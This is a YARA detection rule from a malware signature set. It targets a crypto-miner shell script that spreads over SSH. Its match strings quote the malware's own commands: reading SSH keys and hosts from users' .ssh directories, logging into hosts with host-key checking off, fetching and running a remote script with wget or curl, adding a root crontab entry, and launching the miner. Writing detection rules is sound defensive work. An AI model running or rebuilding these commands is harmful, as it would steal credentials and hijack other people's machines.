/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-04
   Identifier: case116
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_06_04_18_case116_a_crypto_miner_persistence_shell {
   meta:
      description = "case116 - file a.sh"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "6149658a4e8cdcbb610429c376b676da5f2dfb17970dc09b0020052c981074bb"
   strings:
      $x1 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock" fullword ascii
      $x2 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock $XMH" ascii
      $x3 = "$XMHTTP/a.sh;curl -o /dev/null $XMHTTP/CYEY__$payload;curl -o /tmp/.XO-lock $XMHTTP/a.sh; sh /tmp/.XO-lock\"&" fullword ascii
      $x4 = "echo \"*/30 * * * * root  $WGET /tmp/.XO-lock $XMHTTP/a.sh;sh /tmp/.XO-lock;rm /tmp/.XO-lock\" >> /etc/crontab" fullword ascii
      $s5 = "payload=$(echo \".$me.$mykey.$key.$user@$host\") #|base64 -w0)" fullword ascii
      $s6 = "USERS=$(echo $USERS|tr ' ' '\\n'|sort|uniq|grep -v \"/bin/bash\"|grep -v \"~\"|grep -v \"/\"|grep -v keygen|grep -v \"\\-\\-help" ascii
      $s7 = "\".ssh\"|grep -v \"ssh-agent\"|grep -v sshpass|grep -v \"\\-l\"|grep -v \"\\&\")" fullword ascii
      $s8 = "KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F \"IdentityFile\" '{print $2 }')" fullword ascii
      $s9 = "HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F \"HostName\" '{print $2}')" fullword ascii
      $s10 = "echo \"ssh -oStrictHostKeyChecking=no -i $key $user@$host\"" fullword ascii
      $s11 = "HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts| grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")" fullword ascii
      $s12 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN1  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s13 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN6  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s14 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s15 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN5  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s16 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN3  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s17 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN2 -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s18 = "KEYS=$(find ~/ /root /home -maxdepth 2 -name '\\.ssh'|xargs find|awk '/pub|pem/')" fullword ascii
      $s19 = "proc=`grep -c ^processor /proc/cpuinfo`" fullword ascii
      $s20 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1  -B" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 30KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

